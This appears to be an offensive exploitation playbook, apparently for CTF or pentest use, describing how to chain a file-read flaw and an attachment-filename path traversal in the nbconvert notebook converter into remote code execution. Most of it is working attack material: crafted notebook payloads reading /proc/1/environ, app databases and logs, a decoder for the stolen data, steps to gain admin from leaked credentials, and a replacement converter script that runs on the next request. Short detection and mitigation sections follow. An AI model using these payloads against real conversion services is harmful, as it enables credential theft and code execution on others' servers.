# nbconvert / Jupyter Notebook Converter — LFI + Arbitrary Write → RCE

## When this applies

- Backend converts user-supplied `.ipynb` to HTML/Markdown via `nbconvert` (Flask, FastAPI, internal report tools, Voila, JupyterHub batch processors).
- Source review or version pinning shows `nbconvert` (any version up to at least 7.17.0) being used with `HTMLExporter(embed_images=True)` or with markdown export + `FilesWriter` ("saved assets" / extracted attachments).
- Goal: file read → escalate to arbitrary write → RCE.

## Fingerprints

- Upload accepts `.ipynb`, output is HTML or Markdown.
- Job artifact is downloadable as a file (typical "convert and deliver").
- Stack: Python + `nbconvert` + `mistune` (markdown) + `jinja2` (HTML templates).
- "Save extracted asset files" / "include attachments" toggle visible — pivot target for the write primitive.

## Vulnerability sinks

### Sink 1 — Arbitrary file read via `embed_images`

In `nbconvert/filters/markdown_mistune.py::IPythonRenderer._src_to_base64`:

```python
src_path = os.path.join(self.path, src)
if not os.path.exists(src_path):
    return None
with open(src_path, "rb") as fobj:
    base64_data = base64.b64encode(fobj.read())
```

`self.path` is the notebook's directory; `src` is the URL inside a markdown image (`![](url)`). `os.path.join(BASE, "/etc/passwd")` returns `"/etc/passwd"` — the absolute path discards the base. Result is base64-encoded into the rendered HTML as a `data:` URL.

### Sink 2 — Arbitrary file write via attachment filename traversal

`nbconvert/preprocessors/extractattachments.py::ExtractAttachmentsPreprocessor.preprocess_cell`:

```python
for fname in cell.attachments:
    ...
    new_filename = os.path.join(self.path_name, fname)
    resources[self.resources_item_key][new_filename] = decoded
```

`fname` is the attacker-controlled attachment key (any string). Then `nbconvert/writers/files.py::FilesWriter._write_items` does:

```python
for filename, data in items:
    dest = os.path.join(build_dir, filename)
    ...
    with open(dest, "wb") as f:
        f.write(data)
```

Same absolute-path bypass on both joins → write any file the process user can write.

Trigger requires markdown export with the writer enabled (`asset_storage_enabled=on`, `--writer FilesWriter`, or `nbconvert ... --to markdown --output-dir ...` with attachments present).

## Exploit steps

### Step 1 — LFI to discover secrets

Notebook (HTML export, `embed_images=True` server-side):

```json
{
  "cells": [{
    "cell_type": "markdown",
    "metadata": {},
    "source": "![p](/srv/app/data/app.db)\n![q](/var/log/supervisor/supervisord.log)\n"
  }],
  "metadata": {"kernelspec": {"display_name":"Python 3","language":"python","name":"python3"},
               "language_info": {"name":"python","version":"3.11.0"}},
  "nbformat": 4, "nbformat_minor": 5
}
```

Download the rendered HTML, extract from `<img alt="p" src="data:None;base64,...">`:

```python
m = re.search(r'<img alt="p" src="data:[^;]*;base64,([^"]*)"', html)
data = base64.b64decode(m.group(1))
```

Useful first reads: `/proc/1/environ`, `/proc/self/cmdline`, the app's SQLite DB, runtime/log directories, `/etc/hosts`, `/srv/app/app/settings.py`, `/srv/app/app.py`.

Typical pivot: plaintext admin credentials in a freshly-seeded sqlite DB (`data/app.db`, `instance/db.sqlite3`, etc.) — `sqlite3 dump.db "SELECT * FROM users"`.

### Step 2 — Unlock the writer

If the writer is gated behind a toggle (admin-only), get admin via Step 1 credentials, then flip the toggle (POST `/admin` `asset_storage_enabled=on` or equivalent).

### Step 3 — Arbitrary write via attachment

```json
{
  "cells": [{
    "cell_type": "markdown",
    "metadata": {},
    "attachments": {
      "/srv/app/app/converter/convert_job.py": {"text/plain": "<base64 payload>"}
    },
    "source": "![p](attachment:/srv/app/app/converter/convert_job.py)\n"
  }],
  "metadata": {...},
  "nbformat": 4, "nbformat_minor": 5
}
```

Upload with `format=markdown`. The key in `attachments` is the destination path — an absolute path lands at filesystem root, not under `build_dir`.

### Step 4 — RCE via subprocess re-exec

Most "convert" services run the converter as a subprocess (`subprocess.run([python, "convert_job.py", ...])` or similar) on each request. Overwriting the converter script means **the next request runs your code as the app user** without needing a restart.

Useful payload — capture flag/secret and exfil via the normal output path:

```python
#!/usr/bin/env python3
import argparse, json, subprocess
from pathlib import Path
parser = argparse.ArgumentParser()
parser.add_argument("--input", required=True)
parser.add_argument("--output-dir", required=True)
parser.add_argument("--format", required=True)
parser.add_argument("--storage-mode", required=True)
args = parser.parse_args()
out_dir = Path(args.output_dir); out_dir.mkdir(parents=True, exist_ok=True)
flag = subprocess.check_output(["/readflag"], timeout=5).decode(errors="replace")
out_path = out_dir / (Path(args.input).stem + (".html" if args.format=="html" else ".md"))
out_path.write_text("FLAG=" + flag, encoding="utf-8")
print(json.dumps({"status":"ok","output_path": str(out_path)}))
```

Match the CLI signature the parent uses (run the original through `--help` or grep source) and emit whatever stdout JSON the parent expects so the job is marked `completed`. Then download the job output to retrieve stdout/file contents.

## Variants & adjacent primitives

- **Notebook attachment in HTML mode** — does not always reach `FilesWriter`. Markdown + `--writer FilesWriter` (or "saved assets" mode) is the reliable trigger.
- **`metadata.path` / `resource_path`** is used by some custom exporters as the resolution base; setting absolute paths in markdown sources still bypasses it via `os.path.join`.
- **PDF / LaTeX exporters** chain through Jinja templates and a LaTeX compiler — different surface (template injection, LaTeX `\write18` / `\input`).
- **Voila / JupyterHub** run the notebook live (`ExecutePreprocessor`) — that is direct code execution, no chain needed.

## Detection (read-only)

- Upload `notebook.ipynb` containing `![](file:///etc/hostname)` then `![](/etc/hostname)`. Inspect rendered HTML for `data:` URL with the hostname value → confirms `embed_images=True` + absolute-path read.
- Upload notebook with `"attachments": {"/tmp/probe-<rand>.txt": {"text/plain": "<b64>"}}` and markdown source `![](attachment:/tmp/probe-<rand>.txt)`. After conversion, try LFI-read `/tmp/probe-<rand>.txt` to confirm the write primitive.

## Mitigation

- Disable `embed_images` (it's off by default in newer `nbconvert`; always-disable for untrusted notebooks).
- In `ExtractAttachmentsPreprocessor`: sanitize attachment filenames with `os.path.basename` + reject absolute paths and `..` segments before any `os.path.join`.
- In `FilesWriter._write_items`: enforce `os.path.realpath(dest).startswith(os.path.realpath(build_dir) + os.sep)`.
- Run the converter under a separate, sandboxed UID (Firejail / `bwrap` / dedicated container) with read-only system mounts.

## References

- Source: `nbconvert==7.17.0` (`/filters/markdown_mistune.py`, `/preprocessors/extractattachments.py`, `/writers/files.py`).
- Same class as ZipSlip — attacker-controlled name in `os.path.join(target_dir, name)` with no normalization or boundary check.
